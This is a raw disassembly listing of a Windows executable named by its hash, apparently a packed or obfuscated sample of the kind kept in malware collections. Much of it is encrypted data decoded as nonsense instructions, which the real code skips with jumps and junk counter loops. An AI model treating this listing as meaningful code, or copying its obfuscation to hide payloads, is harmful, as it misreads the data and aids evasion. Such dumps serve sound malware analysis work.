
db8eec74a19cc8c24435ea68f6a7b24f81649bf9fe3b9dcfec0bd5ea07f9c37d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc98
  40100b:	jmp    0x4011ce
  401010:	inc    DWORD PTR ss:[esi]
  401013:	shl    BYTE PTR [edi-0x1ca60faf],1
  401019:	fs cmp eax,0x9422c58c
  40101f:	add    DWORD PTR [esi+0x7e],edi
  401022:	jle    0x4010a2
  401024:	cwde   
  401025:	jg     0x4010a5
  401027:	jle    0x400ff7
  401029:	xlat   BYTE PTR ds:[ebx]
  40102a:	cmp    eax,0xcfd339d5
  40102f:	ror    esi,1
  401031:	pop    es
  401032:	add    al,0x3
  401034:	emms   
  401036:	add    BYTE PTR [edi],cl
  401038:	xor    ecx,DWORD PTR [edi]
  40103a:	rcr    BYTE PTR [eax],0xc7
  40103d:	adc    BYTE PTR [edi],bl
  40103f:	mov    ecx,0xddb70058
  401044:	push   cs
  401045:	out    dx,eax
  401046:	mov    ebp,0x8e03d6db
  40104b:	es mov esi,0x1541a2f4
  401051:	lods   eax,DWORD PTR ds:[esi]
  401052:	fiadd  WORD PTR [esi+0x1f]
  401055:	data16 in al,dx
  401057:	outs   dx,DWORD PTR ds:[esi]
  401058:	or     edx,DWORD PTR [ecx]
  40105a:	pushf  
  40105b:	js     0x401033
  40105d:	inc    eax
  40105e:	stos   BYTE PTR es:[edi],al
  40105f:	push   ebx
  401060:	sub    eax,0xad3cc4d1
  401065:	mov    bh,BYTE PTR [ebx-0x3b]
  401068:	stos   DWORD PTR es:[edi],eax
  401069:	push   es
  40106a:	(bad)  
  40106b:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401071:	jmp    0x4010a3
  401073:	mov    ebp,ecx
  401075:	dec    edi
  401076:	out    0xa6,al
  401078:	inc    ecx
  401079:	call   DWORD PTR [edi-0x2556f868]
  40107f:	mov    ebp,0x5536ed4d
  401084:	and    esi,DWORD PTR [edx-0x43619116]
  40108a:	jnp    0x40109d
  40108c:	ret    
  40108d:	xchg   edx,eax
  40108e:	and    esp,edx
  401090:	jmp    0x4010f0
  401092:	ret    0xb8e4
  401095:	lock jmp 0xd765:0x74cf3192
  40109d:	and    ch,cl
  40109f:	add    bl,cl
  4010a1:	adc    DWORD PTR [ecx-0x5a],edx
  4010a4:	xor    eax,0x78616f03
  4010a9:	or     BYTE PTR [ecx],dh
  4010ab:	fisttp QWORD PTR [esi+0x7f752854]
  4010b1:	(bad)
  4010b6:	or     ebx,DWORD PTR [ebx+0x55]
  4010b9:	fst    st(6)
  4010bb:	or     ebx,edx
  4010bd:	pop    esp
  4010be:	fstp   DWORD PTR [ecx]
  4010c0:	jno    0x401060
  4010c2:	inc    esi
  4010c3:	dec    ebx
  4010c4:	aaa    
  4010c5:	adc    eax,0x1a29772b
  4010ca:	sar    DWORD PTR [esi],cl
  4010cc:	dec    edi
  4010cd:	call   0xd866b59f
  4010d2:	mov    esi,0xda9ef2c7
  4010d7:	cmp    ch,BYTE PTR [ebp+ebp*8-0x56203b2d]
  4010de:	test   al,dh
  4010e0:	jno    0x4010fa
  4010e2:	sub    eax,0xa75b2bc
  4010e7:	fcom   DWORD PTR cs:[edi+0x63]
  4010eb:	enter  0x9ff,0x1d
  4010ef:	dec    ecx
  4010f0:	cmp    esp,edx
  4010f2:	push   eax
  4010f3:	inc    ebp
  4010f4:	out    dx,al
  4010f5:	mov    edi,0x266fdba8
  4010fa:	xlat   BYTE PTR ds:[ebx]
  4010fb:	ds daa 
  4010fd:	jmp    0x1051666e
  401102:	int3   
  401103:	fbld   TBYTE PTR [esi-0x70]
  401106:	inc    edx
  401107:	push   ebx
  401108:	(bad)  
  401109:	pop    ds
  40110a:	xchg   dh,ch
  40110c:	lds    ecx,FWORD PTR [ebx]
  40110e:	leave  
  40110f:	jae    0x401162
  401111:	(bad)  
  401112:	les    edx,FWORD PTR [ebx+0x6525dcb8]
  401118:	lahf   
  401119:	lock jp 0x40116f
  40111c:	test   al,0xd4
  40111e:	lods   eax,DWORD PTR ds:[esi]
  40111f:	repnz pop ds
  401121:	pop    eax
  401122:	fisub  WORD PTR [ebp+ecx*2-0x58878c0c]
  401129:	add    eax,0x282d4da7
  40112e:	dec    BYTE PTR [esi+eiz*1+0xa]
  401132:	retf   
  401133:	sbb    eax,0xda78e7de
  401138:	mov    ebx,0x2f1b4049
  40113d:	pop    ebx
  40113e:	dec    ebx
  40113f:	adc    BYTE PTR [esi+0x1130e2c7],0x88
  401146:	lahf   
  401147:	adc    edi,DWORD PTR [ebx+0x40]
  40114a:	sub    BYTE PTR [edi+edx*2],dh
  40114d:	xor    BYTE PTR [eax+0x21],0xa2
  401151:	sub    bh,BYTE PTR [eiz*8-0x18c1b322]
  401158:	add    al,0xad
  40115a:	jbe    0x4011c2
  40115c:	mov    eax,ds:0x8e541c4e
  401161:	xor    edi,DWORD PTR [eax-0x46fe3258]
  401167:	pop    edx
  401168:	sub    eax,0xbb2043b2
  40116d:	in     al,dx
  40116e:	add    BYTE PTR [edi-0x52],0xc8
  401172:	and    bh,BYTE PTR [ebp-0x78]
  401175:	jns    0x4011e9
  401177:	sbb    DWORD PTR [ebx-0x76],ebx
  40117a:	lds    ecx,FWORD PTR [edx+0x693133f8]
  401180:	xchg   esi,eax
  401181:	retf   0x2a1d
  401184:	aaa    
  401185:	iret   
  401186:	mov    bl,0x70
  401188:	xchg   edx,eax
  401189:	daa    
  40118a:	sub    bl,BYTE PTR [ecx*1-0x7b7bd2b9]
  401191:	and    dl,BYTE PTR [ebx]
  401193:	pop    edx
  401194:	mov    cl,0xf9
  401196:	fucomip st,st(4)
  401198:	or     ch,BYTE PTR [ecx+ecx*1-0x5829c06e]
  40119f:	push   ds
  4011a0:	mov    al,ds:0x3171aeb9
  4011a5:	rep ins DWORD PTR es:[edi],dx
  4011a7:	iret   
  4011a8:	jo     0x401170
  4011aa:	cmp    al,dl
  4011ac:	ds int3 
  4011ae:	push   edx
  4011af:	pop    edx
  4011b0:	cmp    BYTE PTR [edx],bl
  4011b2:	and    ebx,DWORD PTR [edi+0x5b]
  4011b5:	test   BYTE PTR [edx],0x9f
  4011b8:	xor    eax,ebx
  4011ba:	push   edi
  4011bb:	push   ds
  4011bc:	push   edi
  4011bd:	add    esi,DWORD PTR [edx+0x18]
  4011c0:	ss std 
  4011c2:	jecxz  0x401242
  4011c4:	adc    eax,0x7c583647
  4011c9:	sbb    edx,DWORD PTR [ebp+0x10]
  4011cc:	loope  0x401223
  4011ce:	mov    DWORD PTR [ebp-0x20],eax
  4011d1:	mov    ecx,0x5d3a
  4011d6:	mov    ecx,DWORD PTR [ebp-0x20]
  4011d9:	mov    DWORD PTR [ebp-0x24],0x4ec1
  4011e0:	cmp    ecx,eax
  4011e2:	jne    0x4020c2
  4011e8:	sbb    ecx,0xfa8
  4011ee:	mov    ax,WORD PTR [ebp-0x24]
  4011f2:	and    DWORD PTR ds:0x4302d5,0x0
  4011fc:	mov    ecx,DWORD PTR ds:0x4302d5
  401202:	inc    ecx
  401203:	mov    DWORD PTR ds:0x4302d5,ecx
  401209:	cmp    DWORD PTR ds:0x4302d5,0xb
  401210:	jne    0x401248
  401216:	push   0x25a9
  40121b:	push   0x3372
  401220:	push   0x5bb7
  401225:	push   DWORD PTR [ebp-0x1c]
  401228:	push   0x6ec1
  40122d:	push   DWORD PTR [ebp-0x28]
  401230:	push   0x3d62
  401235:	push   0x5689
  40123a:	push   DWORD PTR [ebp-0x28]
  40123d:	push   0x7975
  401242:	call   DWORD PTR ds:0x42ea8b
  401248:	cmp    DWORD PTR ds:0x4302d5,0xa
  40124f:	jne    0x401262
  401255:	mov    ecx,DWORD PTR ds:0x4302d5
  40125b:	inc    ecx
  40125c:	mov    DWORD PTR ds:0x4302d5,ecx
  401262:	cmp    DWORD PTR ds:0x4302d5,0x12
  401269:	jb     0x4011fc
  40126f:	mov    DWORD PTR ds:0x4302cd,0x1e
  401279:	cmp    DWORD PTR ds:0x4302cd,0x0
  401280:	je     0x401471
  401286:	cmp    DWORD PTR ds:0x4302cd,0x2d
  40128d:	jne    0x40129c
  401293:	push   DWORD PTR [ebp-0x20]
  401296:	call   DWORD PTR ds:0x42e827
  40129c:	mov    ecx,DWORD PTR ds:0x4302cd
  4012a2:	dec    ecx
  4012a3:	mov    DWORD PTR ds:0x4302cd,ecx
  4012a9:	jmp    0x401279
  4012ae:	jmp    0x401471
  4012b3:	out    0xe8,al
  4012b5:	sub    al,BYTE PTR [ebx]
  4012b7:	xor    cl,al
  4012b9:	imul   ecx
  4012bb:	and    BYTE PTR [ecx],bh
  4012bd:	adc    esi,DWORD PTR [ebx+0x5421e3da]
  4012c3:	cwde   
  4012c4:	jg     0x401344
  4012c6:	jle    0x401260
  4012c8:	jg     0x401348
  4012ca:	jle    0x40126b
  4012cc:	adc    ecx,DWORD PTR [edi+0x1f]
  4012cf:	xor    bl,BYTE PTR [ebx]
  4012d1:	pop    edi
  4012d2:	aad    0xed
  4012d4:	or     al,0x37
  4012d6:	pushf  
  4012d7:	sbb    eax,ebx
  4012d9:	in     al,dx
  4012da:	sbb    DWORD PTR [edx],ecx
  4012dc:	mov    esi,0x9b594309
  4012e1:	and    eax,0xd96aaa01
  4012e6:	sub    edi,DWORD PTR [esp+ebp*4]
  4012e9:	into   
  4012ea:	push   esp
  4012eb:	dec    ebx
  4012ec:	jns    0x4012a9
  4012ee:	jl     0x401315
  4012f0:	mov    dl,0xa9
  4012f2:	fisub  WORD PTR [edi-0x39e3bcc4]
  4012f8:	sbb    ebx,ebx
  4012fa:	mov    ah,0x96
  4012fc:	mov    WORD PTR [edx+0x3febcc2],gs
  401302:	jnp    0x401344
  401304:	sub    BYTE PTR [edx+ebx*2],dh
  401307:	mov    al,ds:0xb8655566
  40130c:	pop    ss
  40130d:	mov    al,0x6b
  40130f:	mov    WORD PTR [edi+0x95649d],gs
  401315:	pop    ecx
  401316:	retf   
  401317:	mov    bh,BYTE PTR [esi]
  401319:	sub    ah,BYTE PTR [ecx-0x36]
  40131c:	push   0xbacf8a4d
  401321:	nop
  401322:	pop    ebx
  401323:	dec    edi
  401324:	scas   al,BYTE PTR es:[edi]
  401325:	mov    bh,0xea
  401327:	(bad)  
  401329:	test   dl,bh
  40132b:	fiadd  DWORD PTR [edx-0x298dc162]
  401331:	call   DWORD PTR [ebp+0x7f73b36]
  401337:	clc    
  401338:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401339:	leave  
  40133a:	sbb    al,0x6a
  40133c:	and    eax,0xddee00a3
  401341:	jo     0x401304
  401343:	scas   eax,DWORD PTR es:[edi]
  401344:	popa   
  401345:	xor    al,0xf7
  401347:	enter  0x5509,0xfb
  40134b:	fdivr  QWORD PTR [eax-0x107d3fff]
  401351:	sar    BYTE PTR [ecx],1
  401353:	or     ebp,DWORD PTR [edx-0x3c]
  401356:	and    al,0xa3
  401358:	lea    edi,[edi]
  40135a:	xchg   esp,eax
  40135b:	(bad)  
  40135c:	sbb    eax,0x5ffb76e4
  401361:	mov    DWORD PTR [esi+0x364a52d0],ebx
  401367:	mov    eax,ds:0x836da795
  40136c:	popf   
  40136d:	mov    al,ds:0x8a93b991
  401372:	cmp    ah,al
  401374:	inc    ecx
  401375:	jmp    0x88e586c
  40137a:	fld    QWORD PTR [edi-0x6cf5f72]
  401380:	(bad)  
  401381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401382:	add    edx,DWORD PTR ds:0x2e80e51
  401388:	sbb    BYTE PTR [edx+0x349c322c],ah
  40138e:	adc    bh,BYTE PTR [eax-0x67]
  401391:	mov    BYTE PTR [edx-0x34],bh
  401394:	jecxz  0x401325
  401396:	inc    edi
  401397:	jno    0x4013f3
  401399:	pusha  
  40139a:	mov    bh,BYTE PTR [esi]
  40139c:	dec    esi
  40139d:	bound  ebx,QWORD PTR [edx+0x6a]
  4013a0:	fcomp  DWORD PTR [edi-0xafd73c2]
  4013a6:	push   ebp
  4013a7:	xor    BYTE PTR [ecx+0x7e6ab9fa],dl
  4013ad:	out    dx,eax
  4013ae:	(bad)  
  4013af:	jp     0x401411
  4013b1:	mov    cs,eax
  4013b3:	ja     0x4013ac
  4013b5:	adc    eax,DWORD PTR [eax-0x78]
  4013b8:	aad    0x58
  4013ba:	lds    esi,FWORD PTR [edx]
  4013bc:	mov    ah,0x56
  4013be:	sub    eax,0x181d4aa5
  4013c3:	or     al,0x20
  4013c5:	pop    edi
  4013c6:	push   esp
  4013c7:	mov    ah,BYTE PTR [ebx+0x29aceb5f]
  4013cd:	sbb    eax,0x5c6d1582
  4013d2:	sub    eax,0xbad6934e
  4013d7:	lock xchg edi,eax
  4013d9:	ss pop ss
  4013db:	pop    eax
  4013dc:	pop    eax
  4013dd:	mov    al,ds:0x191d27e4
  4013e2:	or     al,BYTE PTR [ebx-0x1e]
  4013e5:	arpl   WORD PTR [edx+ecx*8-0x34a083ad],bp
  4013ec:	mov    ds:0x3ddc2877,eax
  4013f1:	retf   0x5ff4
  4013f4:	sbb    ebx,ebp
  4013f6:	or     al,0x8a
  4013f8:	mov    eax,ds:0xd5fda5c0
  4013fd:	fild   WORD PTR ds:0xe7b332ae
  401403:	cmp    eax,0x569cd138
  401408:	jle    0x401449
  40140a:	pushf  
  40140b:	mov    ch,cl
  40140d:	pop    ebp
  40140e:	push   cs
  40140f:	mov    ch,0x5f
  401411:	xor    bh,BYTE PTR [ecx+0x4df46a01]
  401417:	mov    edx,0xc96d1a7a
  40141c:	leave  
  40141d:	dec    edi
  40141e:	nop
  40141f:	std    
  401420:	int3   
  401421:	sbb    DWORD PTR [ecx+0x52f8943d],esi
  401427:	pop    ss
  401428:	in     eax,dx
  401429:	fisubr DWORD PTR [edx-0x4eff303f]
  40142f:	les    esp,FWORD PTR [edx-0x65]
  401432:	stos   DWORD PTR es:[edi],eax
  401433:	mov    bl,0x72
  401435:	pop    ss
  401436:	rcr    BYTE PTR [edx-0x12],1
  401439:	pop    eax
  40143a:	lea    edi,[edx+ebp*1+0x327220ea]
  401441:	pop    ebx
  401442:	or     DWORD PTR [ebp+0x4c480b42],esi
  401448:	xchg   edx,eax
  401449:	cs stos BYTE PTR es:[edi],al
  40144b:	int    0xf3
  40144d:	aam    0xf5
  40144f:	cmc    
  401450:	mov    ds:0x2efd7258,al
  401455:	cmp    eax,0x107188ff
  40145a:	popf   
  40145b:	rcr    BYTE PTR [ebp-0x5019a517],cl
  401461:	repnz int 0x4a
  401464:	in     al,dx
  401465:	ret    0x6a0f
  401468:	push   ds
  401469:	cmc    
  40146a:	sub    dl,ah
  40146c:	mov    DWORD PTR [esi],ebp
  40146e:	sti    
  40146f:	xor    edi,ebx
  401471:	push   esi
  401472:	mov    ecx,0x8a3c
  401477:	adc    DWORD PTR ds:0x42ec5b,0x2f3d
  401481:	xor    ax,cx
  401484:	movzx  esi,WORD PTR ds:0x4302b9
  40148b:	or     DWORD PTR ds:0x43036b,esi
  401491:	mov    ecx,DWORD PTR [ebp+0x8]
  401494:	jmp    0x401657
  401499:	adc    eax,0x716ff192
  40149e:	ins    DWORD PTR es:[edi],dx
  40149f:	xchg   ecx,eax
  4014a0:	jo     0x40144d
  4014a2:	or     eax,0x875b0fff
  4014a7:	adc    ecx,DWORD PTR [ecx-0x3e]
  4014aa:	jge    0x40152a
  4014ac:	jle    0x401446
  4014ae:	jg     0x40152e
  4014b0:	jle    0x401490
  4014b2:	push   es
  4014b3:	jl     0x401447
  4014b5:	sub    DWORD PTR [eax+edx*1],ebx
  4014b8:	popf   
  4014b9:	in     eax,dx
  4014ba:	pop    edi
  4014bb:	cmp    BYTE PTR [edx],bl
  4014bd:	das    
  4014be:	js     0x4014b8
  4014c0:	clc    
  4014c1:	out    dx,al
  4014c2:	cmp    eax,0xece370a9
  4014c7:	push   es
  4014c8:	data16 stc 
  4014ca:	adc    esi,DWORD PTR [ebp-0x16]
  4014cd:	lock dec eax
  4014cf:	adc    DWORD PTR [esi],ecx
  4014d1:	dec    edx
  4014d2:	in     al,dx
  4014d3:	mov    ds:0xaf8b602f,eax
  4014d8:	adc    eax,0xa3f4dfaf
  4014dd:	sbb    esp,ebx
  4014df:	sbb    DWORD PTR [eax],eax
  4014e1:	rcl    DWORD PTR [eax-0x61],1
  4014e4:	sbb    BYTE PTR ss:[eax],dl
  4014e7:	retf   
  4014e8:	popa   
  4014e9:	into   
  4014ea:	cli    
  4014eb:	jno    0x40155c
  4014ed:	push   ecx
  4014ee:	add    eax,DWORD PTR ds:0xebde
  4014f3:	(bad)  
  4014f4:	cmp    esi,esp
  4014f6:	icebp  
  4014f7:	mov    ds:0x94ec015,eax
  4014fc:	adc    eax,0x52ce5db5
  401501:	(bad)  
  401502:	adc    ah,dl
  401504:	hlt    
  401505:	jmp    0x4014a9
  401507:	xchg   ebx,eax
  401508:	jbe    0x401492
  40150a:	inc    edi
  40150b:	push   esi
  40150c:	jae    0x4014af
  40150e:	retf   0xc31c
  401511:	jmp    0x40153f
  401513:	xchg   DWORD PTR [edi+0x7e1e1016],ecx
  401519:	xor    ecx,esi
  40151b:	cmp    DWORD PTR [edx],edx
  40151d:	or     DWORD PTR [ecx],ebp
  40151f:	mov    al,ds:0xf38f2226
  401524:	bound  edx,QWORD PTR [ebx+0x59]
  401527:	inc    esi
  401528:	jg     0x4015a9
  40152a:	ins    DWORD PTR es:[edi],dx
  40152b:	ret    0x95c4
  40152e:	mov    bh,0x65
  401530:	les    esp,FWORD PTR [esi-0x4f7d4b33]
  401536:	sbb    bh,BYTE PTR [ecx]
  401538:	pushf  
  401539:	mov    dh,0xbf
  40153b:	(bad)  
  40153c:	mov    al,ds:0xc90182e2
  401541:	adc    DWORD PTR [esi],0xffffffa0
  401544:	mul    BYTE PTR [ebx+edi*8+0x1596d561]
  40154b:	sub    esp,DWORD PTR [edx-0x67]
  40154e:	inc    esp
  40154f:	icebp  
  401550:	scas   al,BYTE PTR es:[edi]
  401551:	lea    eax,[eax+0x41]
  401554:	fisub  WORD PTR [ebx-0x49]
  401557:	or     DWORD PTR [edi+0x32fe1a0],esi
  40155d:	dec    esi
  40155e:	jecxz  0x401519
  401560:	jmp    0x401575
  401562:	imul   esp,esp,0x33
  401565:	add    eax,0x39c9ae59
  40156a:	cmp    eax,0x8f1f5607
  40156f:	adc    eax,DWORD PTR [eax+ebx*1+0x7f]
  401573:	jo     0x4015f4
  401575:	cmc    
  401576:	jno    0x401521
  401578:	ins    BYTE PTR es:[edi],dx
  401579:	addr16 (bad) 
  40157b:	jmp    DWORD PTR [eax]
  40157d:	mov    WORD PTR [ebx+0x51],?
  401580:	mov    al,ds:0xf4715949
  401585:	xchg   ebp,eax
  401586:	push   cs
  401587:	(bad)  
  401588:	xchg   ebx,eax
  401589:	into   
  40158a:	jb     0x401552
  40158c:	mov    dl,0x51
  40158e:	push   ecx
  40158f:	push   esi
  401590:	mov    ?,esp
  401592:	fwait
  401593:	shl    ah,cl
  401595:	out    0xd7,eax
  401597:	arpl   sp,dx
  401599:	sar    BYTE PTR [edx+0x1a],0x87
  40159d:	into   
  40159e:	cmp    bh,al
  4015a0:	fnsave [edi-0x5b]
  4015a3:	push   ss
  4015a4:	sbb    al,ch
  4015a6:	retf   
  4015a7:	test   ebp,esi
  4015a9:	ins    BYTE PTR es:[edi],dx
  4015aa:	repnz lods eax,DWORD PTR ds:[esi]
  4015ac:	mov    eax,ds:0x4d01bf25
  4015b1:	jmp    0x401539
  4015b3:	push   esi
  4015b4:	or     al,BYTE PTR [edi-0x66]
  4015b7:	inc    DWORD PTR [edx+0xc]
  4015ba:	mov    ds:0xcc5f804,eax
  4015bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015c0:	inc    ecx
  4015c1:	push   eax
  4015c2:	into   
  4015c3:	mov    al,0x7a
  4015c5:	es mov esi,0x13f5c9c0
  4015cb:	and    dl,dl
  4015cd:	mov    al,ds:0x2f34f9cf
  4015d2:	out    dx,al
  4015d3:	ins    BYTE PTR es:[edi],dx
  4015d4:	stc    
  4015d5:	xchg   edi,eax
  4015d6:	xchg   edx,eax
  4015d7:	adc    BYTE PTR [ecx+0x2f243cd1],dh
  4015dd:	fnsave [ecx+0x48f38992]
  4015e3:	jae    0x401600
  4015e5:	cmp    al,0x64
  4015e7:	pop    ds
  4015e8:	sbb    DWORD PTR [ebx+esi*1-0x88fcf2d],0x6b
  4015f0:	repnz cli 
  4015f2:	(bad)  
  4015f3:	aad    0xd9
  4015f5:	push   edx
  4015f6:	shr    BYTE PTR [ecx],cl
  4015f8:	lods   eax,DWORD PTR ds:[esi]
  4015f9:	xor    ch,BYTE PTR [ecx+ecx*4-0x7f51ab62]
  401600:	push   es
  401601:	in     al,0xa4
  401603:	push   ecx
  401604:	pop    es
  401605:	(bad)  
  401606:	call   0x9b611fdf
  40160b:	scas   al,BYTE PTR es:[edi]
  40160c:	inc    edi
  40160d:	movsx  esi,dl
  401610:	sbb    al,0x35
  401612:	out    dx,eax
  401613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401614:	pop    es
  401615:	pusha  
  401616:	mov    bh,0x8d
  401618:	mov    cl,0xf5
  40161a:	stos   DWORD PTR es:[edi],eax
  40161b:	ss sub ah,0x64
  40161f:	out    0x1a,al
  401621:	lock cmp DWORD PTR [edx],edi
  401624:	mov    DWORD PTR ds:[ebp+ecx*4-0x54],esp
  401629:	sbb    eax,0x6a07a5a5
  40162e:	xchg   ecx,eax
  40162f:	sti    
  401630:	push   cs
  401631:	xchg   DWORD PTR [esi+eiz*4+0x15],ebx
  401635:	or     DWORD PTR [ebp-0x6a157868],esp
  40163b:	idiv   edi
  40163d:	and    dh,dh
  40163f:	dec    esp
  401640:	(bad)  
  401641:	jmp    0x40165a
  401643:	mov    eax,0x47258339
  401648:	xchg   esp,ecx
  40164a:	sbb    bh,BYTE PTR [ebx-0x30]
  40164d:	sahf   
  40164e:	sbb    eax,0x38a7eff8
  401653:	sub    BYTE PTR [ecx],cl
  401655:	adc    DWORD PTR ss:[edi+0x23],0xfffffff7
  40165a:	jmp    0x40181d
  40165f:	push   cs
  401660:	and    BYTE PTR [edi],dh
  401662:	pop    ebp
  401663:	xor    DWORD PTR [ecx+0x54],ebp
  401666:	jno    0x4016b3
  401668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401669:	cmp    BYTE PTR [edi],bl
  40166b:	dec    esi
  40166c:	ds pop ebp
  40166e:	and    DWORD PTR [edx+edi*2+0x7e],ebp
  401672:	jle    0x40160c
  401674:	jg     0x4016f4
  401676:	jle    0x40161f
  401678:	mov    dl,0x11
  40167a:	cmp    al,0x14
  40167c:	mov    ss,WORD PTR ds:0x9dfa17c7
  401682:	sub    al,0x63
  401684:	pusha  
  401685:	lds    edx,FWORD PTR [ecx+0x7bb4b84e]
  40168b:	mov    esi,0x24425c15
  401690:	repz and eax,0x2dcc1df6
  401696:	push   eax
  401697:	fadd   DWORD PTR [esi-0x69c64874]
  40169d:	int3   
  40169e:	std    
  40169f:	retf   0x556d
  4016a2:	cmp    eax,0xf079aac2
  4016a7:	add    DWORD PTR [ecx],edi
  4016a9:	xchg   edx,eax
  4016aa:	loope  0x401708
  4016ac:	pop    esi
  4016ad:	std    
  4016ae:	xchg   DWORD PTR [edx+0x12],esp
  4016b1:	mov    ecx,edi
  4016b3:	xor    DWORD PTR ds:0x9a25ef63,esp
  4016b9:	cmp    al,0xbf
  4016bb:	outs   dx,DWORD PTR ds:[esi]
  4016bc:	adc    al,0x13
  4016be:	ds xchg ebp,eax
  4016c0:	aas    
  4016c1:	mov    eax,ds:0x6f29d725
  4016c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016c7:	pop    es
  4016c8:	jmp    0x2c9e:0xd0b09763
  4016cf:	fadd   QWORD PTR [edx-0x77220148]
  4016d5:	xor    DWORD PTR [edi-0x51da6496],edi
  4016db:	push   0x14
  4016dd:	loopne 0x401736
  4016df:	inc    edi
  4016e0:	or     esp,DWORD PTR [edi+0x701e9df8]
  4016e6:	cmp    ch,BYTE PTR [edi+0xd9a1937]
  4016ec:	sub    bl,BYTE PTR [eax+0x799056f2]
  4016f2:	pop    esp
  4016f3:	add    dl,0x9
  4016f6:	lods   eax,DWORD PTR ds:[esi]
  4016f7:	leave  
  4016f8:	mov    eax,ds:0x6198a5e8
  4016fd:	adc    al,0x57
  4016ff:	mov    ch,0xef
  401701:	clc    
  401702:	mov    bl,0x99
  401704:	dec    ebp
  401705:	outs   dx,DWORD PTR ds:[esi]
  401706:	call   0xf73eff1f
  40170b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40170c:	add    BYTE PTR [ebp+0x6],0xa7
  401710:	xchg   esp,eax
  401711:	lds    edx,FWORD PTR [edx-0x4a]
  401714:	mov    ?,WORD PTR [ebp-0x37]
  401717:	mov    WORD PTR [edx-0x6aad65ab],gs
  40171d:	je     0x40176c
  40171f:	loope  0x4016c0
  401721:	leave  
  401722:	fadd   DWORD PTR ds:0x5dd1e3b3
  401728:	fdivr  DWORD PTR [ebx+esi*8-0x60d700d4]
  40172f:	dec    esp
  401730:	dec    edi
  401731:	mov    dl,0xba
  401733:	std    
  401734:	inc    esp
  401735:	mov    esi,0x704bc2ea
  40173a:	je     0x40178a
  40173c:	push   esi
  40173d:	jo     0x401769
  40173f:	loope  0x401721
  401741:	repnz mov ebp,DWORD PTR [edx-0x2b72e659]
  401748:	mov    al,0x4d
  40174a:	loop   0x4016f9
  40174c:	pop    ecx
  40174d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40174e:	mov    al,ds:0x1e9474e9
  401753:	pop    ebp
  401754:	(bad)  [ebx+0x53e7ac2d]
  40175a:	fist   DWORD PTR [edx]
  40175c:	std    
  40175d:	loope  0x4017ae
  40175f:	sahf   
  401760:	fcom   DWORD PTR [ecx]
  401762:	adc    BYTE PTR ss:[ecx+0x71],bl
  401766:	inc    edx
  401767:	imul   ecx,edi,0x5c4e4ed7
  40176d:	loope  0x4017d4
  40176f:	mov    edi,0xad0cdbdf
  401774:	push   eax
  401775:	xor    BYTE PTR ds:[ebx+0x752646c3],0x9b
  40177d:	and    BYTE PTR [ecx],0x3b
  401780:	retf   0x141e
  401783:	out    0x76,al
  401785:	sub    DWORD PTR [edx-0x5ca75cfb],ebp
  40178b:	out    dx,eax
  40178c:	dec    eax
  40178d:	sbb    BYTE PTR [eax-0x622b3dbc],dl
  401793:	mov    ds:0x34624117,al
  401798:	ror    DWORD PTR [esp+ebx*2],1
  40179b:	add    eax,0xa6e4e7e1
  4017a0:	scas   eax,DWORD PTR es:[edi]
  4017a1:	xchg   BYTE PTR [esi],ch
  4017a3:	mov    esp,ebx
  4017a5:	das    
  4017a6:	sti    
  4017a7:	and    dh,dh
  4017a9:	adc    eax,0x151e9878
  4017ae:	xor    BYTE PTR [edx+0x5b7aad05],0x6b
  4017b5:	sub    BYTE PTR [eax+ebp*8-0x11],al
  4017b9:	cdq    
  4017ba:	sahf   
  4017bb:	xchg   esi,eax
  4017bc:	mov    bh,0xe4
  4017be:	test   BYTE PTR [edi+0x5b33aabd],dl
  4017c4:	or     BYTE PTR [ebp+0x6bf8a983],al
  4017ca:	out    dx,eax
  4017cb:	inc    esi
  4017cc:	aas    
  4017cd:	stos   BYTE PTR es:[edi],al
  4017ce:	mov    edx,0x2f4ebbb4
  4017d3:	pop    ds
  4017d4:	xchg   DWORD PTR [ecx-0x2b],ebx
  4017d7:	test   BYTE PTR [edi+0x4a20b63b],0x88
  4017de:	push   ecx
  4017df:	push   ecx
  4017e0:	outs   dx,BYTE PTR ds:[esi]
  4017e1:	mov    ds:0x2a569d89,al
  4017e6:	or     eax,DWORD PTR [eax+0x8]
  4017e9:	push   ds
  4017ea:	cmp    DWORD PTR [ebp+0x33],eax
  4017ed:	(bad)  
  4017ee:	mov    ds:0x4f67c17c,eax
  4017f3:	or     DWORD PTR [edx+0x5f131899],0x38
  4017fa:	pushf  
  4017fb:	adc    eax,0xe9bcd03d
  401800:	fcomp  QWORD PTR [eax+0x7a]
  401803:	xor    eax,0xc24e5e5b
  401808:	test   eax,0xc2b98db5
  40180d:	sbb    eax,0x33b16bca
  401812:	xchg   ebx,eax
  401813:	jp     0x4017b6
  401815:	mov    edi,0x559aa03c
  40181a:	call   DWORD PTR [edi+0x39]
  40181d:	mov    edi,0x3b02
  401822:	add    ax,di
  401825:	mov    DWORD PTR ds:0x4302d5,0x60d8
  40182f:	movzx  eax,ax
  401832:	and    DWORD PTR ds:0x4302d9,0x0
  40183c:	mov    esi,DWORD PTR ds:0x4302d9
  401842:	inc    esi
  401843:	mov    DWORD PTR ds:0x4302d9,esi
  401849:	cmp    DWORD PTR ds:0x4302d9,0x1d
  401850:	jne    0x401863
  401856:	push   0x0
  401858:	push   0x21fd
  40185d:	call   DWORD PTR ds:0x42e913
  401863:	cmp    DWORD PTR ds:0x4302d9,0x10
  40186a:	jb     0x40183c
  401870:	sbb    esi,0x67dd
  401876:	not    eax
  401878:	and    eax,DWORD PTR [ecx]
  40187a:	and    DWORD PTR ds:0x430363,0x0
  401884:	jmp    0x401898
  401889:	xor    esi,esi
  40188b:	xor    esi,DWORD PTR ds:0x430363
  401891:	inc    esi
  401892:	mov    DWORD PTR ds:0x430363,esi
  401898:	cmp    DWORD PTR ds:0x430363,0x1b
  40189f:	jae    0x4018dc
  4018a5:	cmp    DWORD PTR ds:0x430363,0x8
  4018ac:	jne    0x4018bd
  4018b2:	push   0x780b
  4018b7:	call   DWORD PTR ds:0x42e82b
